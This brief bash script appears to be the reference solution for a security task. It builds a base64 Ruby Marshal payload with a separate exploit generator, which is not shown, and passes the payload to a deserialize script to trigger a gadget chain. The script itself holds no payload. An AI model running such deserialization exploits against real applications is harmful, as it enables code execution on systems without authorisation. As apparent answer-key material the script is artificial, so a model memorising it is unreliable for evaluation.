#!/bin/bash


# Copy the exploit generator to /app/
cp /solution/exploit_builder.rb /app/exploit.rb

# Generate the base64-encoded Marshal payload
payload=$(ruby /app/exploit.rb)

# Deserialize the payload to trigger the gadget chain
ruby /app/deserialize.rb "$payload"
